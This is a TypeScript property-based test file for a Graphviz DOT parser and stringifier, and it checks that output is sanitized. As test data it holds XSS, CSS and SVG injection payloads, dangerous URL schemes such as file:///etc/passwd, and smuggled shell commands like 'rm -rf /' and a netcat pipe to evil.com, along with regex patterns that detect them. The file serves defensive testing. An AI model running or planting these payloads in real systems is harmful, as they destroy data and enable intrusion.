import { parse, stringify } from '@ts-graphviz/ast';
import * as fc from 'fast-check';
import { describe, it, expect } from 'vitest';
import {
  SecurityArbitraries,
  SecurityTestPatterns,
  SecurityValidators,
  ATTACK_PATTERNS,
  SecurityMockFactory
} from './utils/security-test-helpers.js';

/**
 * Tests for input sanitization and output encoding
 * Verifies that the library properly sanitizes inputs and encodes outputs
 */
const isCI = process.env.CI === 'true';
const isStressTest = process.env.SKIP_STRESS_TESTS === 'true';

describe.concurrent('Input Sanitization and Output Encoding Tests', () => {
  describe('HTML/XML Output Sanitization', () => {
    it('should properly escape HTML special characters in output', () => {
      const htmlChars = ['<', '>', '&', '"', "'"];
      
      fc.assert(
        fc.property(
          fc.string(),
          fc.constantFrom(...htmlChars),
          (baseString, htmlChar) => {
            const input = baseString + htmlChar + 'test';
            const dotString = `digraph G { a [label="${input}"]; }`;
            
            try {
              const result = parse(dotString);
              const output = stringify(result);
              
              // Check that HTML characters are properly handled in output
              if (output.includes('<')) {
                // If < is present, it should be in a valid context or escaped
                expect(output).not.toMatch(/<(?!\/?\w+[^>]*>)/);
              }
              
              return true;
            } catch (error) {
              expect(error).toBeInstanceOf(Error);
              return true;
            }
          }
        ),
        { numRuns: 200 }
      );
    });

    it('should handle XML namespace and processing instruction injection', () => {
      fc.assert(
        fc.property(
          SecurityArbitraries.maliciousString('xml_injection'),
          (xmlPattern) => {
            const dotString = `digraph G { a [label="${xmlPattern}"]; }`;
            
            try {
              const result = parse(dotString);
              const output = stringify(result);
              
              // XML declarations and processing instructions should be escaped or removed
              expect(output).not.toMatch(/<\?xml/);
              expect(output).not.toMatch(/<!DOCTYPE/);
              expect(output).not.toMatch(/<!ENTITY/);
              expect(output).not.toMatch(/<!\[CDATA\[/);
              
              return true;
            } catch (error) {
              expect(error).toBeInstanceOf(Error);
              return true;
            }
          }
        ),
        { numRuns: 50 }
      );
    });
  });

  describe('CSS Injection Prevention', () => {
    it('should handle CSS injection attempts in style attributes', () => {
      const cssInjectionPatterns = [
        'color: red; background: url(javascript:alert(1))',
        'color: red; expression(alert(1))',
        'color: red; -moz-binding: url(http://evil.com/evil.xml)',
        'color: red; behavior: url(evil.htc)',
        'color: red</style><script>alert(1)</script>',
        'color: red; @import url(http://evil.com/evil.css)',
        'color: red; background: url(data:text/html,<script>alert(1)</script>)',
        'color: red; position: fixed; top: 0; left: 0; width: 100%; height: 100%',
      ];

      fc.assert(
        fc.property(fc.constantFrom(...cssInjectionPatterns), (cssPattern) => {
          const dotString = `digraph G { a [style="${cssPattern}"]; }`;
          
          try {
            const result = parse(dotString);
            const output = stringify(result);
            
            // CSS injection patterns should be neutralized
            expect(output).not.toMatch(/javascript:/i);
            expect(output).not.toMatch(/expression\s*\(/i);
            expect(output).not.toMatch(/-moz-binding/i);
            expect(output).not.toMatch(/behavior\s*:/i);
            expect(output).not.toMatch(/<\/style>/i);
            expect(output).not.toMatch(/@import/i);
            
            return true;
          } catch (error) {
            expect(error).toBeInstanceOf(Error);
            return true;
          }
        }),
        { numRuns: 50 }
      );
    });
  });

  describe('SVG Injection Prevention', () => {
    it('should handle SVG-specific injection attempts', () => {
      const svgInjectionPatterns = [
        '<svg onload="alert(1)">',
        '<foreignObject><script>alert(1)</script></foreignObject>',
        '<animate attributeName="href" values="javascript:alert(1)"/>',
        '<use href="javascript:alert(1)"/>',
        '<image href="javascript:alert(1)"/>',
        '<feImage href="javascript:alert(1)"/>',
        '<script href="data:text/javascript,alert(1)"/>',
        '<set attributeName="onload" to="alert(1)"/>',
        '<text><tspan onload="alert(1)">test</tspan></text>'
      ];

      fc.assert(
        fc.property(fc.constantFrom(...svgInjectionPatterns), (svgPattern) => {
          const dotString = `digraph G { a [label=<${svgPattern}>]; }`;
          
          try {
            const result = parse(dotString);
            const output = stringify(result);
            
            // SVG injection patterns should be neutralized
            expect(output).not.toMatch(/onload\s*=/i);
            expect(output).not.toMatch(/onerror\s*=/i);
            expect(output).not.toMatch(/href\s*=\s*["']javascript:/i);
            expect(output).not.toMatch(/<script[^>]*>/i);
            expect(output).not.toMatch(/<foreignObject/i);
            
            return true;
          } catch (error) {
            expect(error).toBeInstanceOf(Error);
            return true;
          }
        }),
        { numRuns: 50 }
      );
    });
  });

  describe('URL Validation and Sanitization', () => {
    it('should validate and sanitize URLs in attributes', () => {
      fc.assert(
        fc.property(
          fc.oneof(
            fc.webUrl(),
            fc.constant('javascript:alert(1)'),
            fc.constant('data:text/html,<script>alert(1)</script>'),
            fc.constant('vbscript:msgbox(1)'),
            fc.constant('file:///etc/passwd'),
            fc.constant('ftp://malicious.com/payload'),
            fc.string()
          ),
          (url) => {
            const dotString = `digraph G { a [URL="${url}"]; }`;
            
            try {
              const result = parse(dotString);
              const output = stringify(result);
              
              // Dangerous URL schemes should be blocked or sanitized
              expect(output).not.toMatch(/javascript:/i);
              expect(output).not.toMatch(/vbscript:/i);
              expect(output).not.toMatch(/data:text\/html/i);
              
              return true;
            } catch (error) {
              expect(error).toBeInstanceOf(Error);
              return true;
            }
          }
        ),
        { numRuns: 100 }
      );
    });

    it('should handle protocol-relative URLs safely', () => {
      const protocolRelativeUrls = [
        '//evil.com/payload',
        '//evil.com/script.js',
        '//127.0.0.1/malicious',
        '//localhost/evil',
        '//[::1]/payload',
        '//192.168.1.1/script'
      ];

      fc.assert(
        fc.property(fc.constantFrom(...protocolRelativeUrls), (url) => {
          const dotString = `digraph G { a [URL="${url}"]; }`;
          
          try {
            const result = parse(dotString);
            const output = stringify(result);
            
            // Protocol-relative URLs should be handled safely
            expect(output).toBeDefined();
            
            return true;
          } catch (error) {
            expect(error).toBeInstanceOf(Error);
            return true;
          }
        }),
        { numRuns: 50 }
      );
    });
  });

  describe('Attribute Value Sanitization', () => {
    it('should sanitize dangerous attribute values', () => {
      fc.assert(
        fc.property(
          fc.oneof(
            fc.string(),
            fc.float(),
            fc.integer(),
            fc.boolean()
          ),
          (value) => {
            const stringValue = String(value);
            const dotString = `digraph G { a [custom="${stringValue}"]; }`;
            
            try {
              const result = parse(dotString);
              const output = stringify(result);
              
              // Output should be properly formatted and safe
              expect(output).toBeDefined();
              expect(typeof output).toBe('string');
              
              // Check for basic safety
              if (output.includes(stringValue)) {
                // If the value is included, it should be properly quoted/escaped
                expect(output).not.toMatch(/[^"]*"[^"]*"[^"]*/); // No unescaped quotes
              }
              
              return true;
            } catch (error) {
              expect(error).toBeInstanceOf(Error);
              return true;
            }
          }
        ),
        { numRuns: 200 }
      );
    });

    it('should handle boolean attribute manipulation', () => {
      const booleanManipulation = [
        'true" onload="alert(1)" dummy="',
        'false</script><script>alert(1)</script>',
        '1 && alert(1)',
        '0 || alert(1)',
        'yes; rm -rf /',
        'no | nc evil.com 9999'
      ];

      fc.assert(
        fc.property(fc.constantFrom(...booleanManipulation), (boolValue) => {
          const dotString = `digraph G { a [fixedsize="${boolValue}"]; }`;
          
          try {
            const result = parse(dotString);
            const output = stringify(result);
            
            // Boolean attributes should be sanitized
            expect(output).not.toMatch(/onload\s*=/);
            expect(output).not.toMatch(/<\/script>/);
            expect(output).not.toMatch(/&&||\|\|/);
            expect(output).not.toMatch(/;\s*rm\s+-rf/);
            
            return true;
          } catch (error) {
            expect(error).toBeInstanceOf(Error);
            return true;
          }
        }),
        { numRuns: 50 }
      );
    });
  });

  describe('Numeric Value Validation', () => {
    it('should validate numeric attributes safely', () => {
      fc.assert(
        fc.property(
          fc.oneof(
            fc.float({ min: -1e6, max: 1e6, noNaN: true }),
            fc.integer({ min: -1000000, max: 1000000 }),
            fc.constant('NaN'),
            fc.constant('Infinity'),
            fc.constant('-Infinity'),
            fc.constant('1e999'),
            fc.constant('-1e999')
          ),
          (numValue) => {
            const dotString = `digraph G { a [width="${numValue}"]; }`;
            
            try {
              const result = parse(dotString);
              const output = stringify(result);
              
              // Numeric values should be properly handled
              expect(output).toBeDefined();
              
              // Extreme values should be bounded or rejected
              expect(output).not.toMatch(/1e999/);
              expect(output).not.toMatch(/-1e999/);
              
              return true;
            } catch (error) {
              expect(error).toBeInstanceOf(Error);
              return true;
            }
          }
        ),
        { numRuns: 100 }
      );
    });
  });
});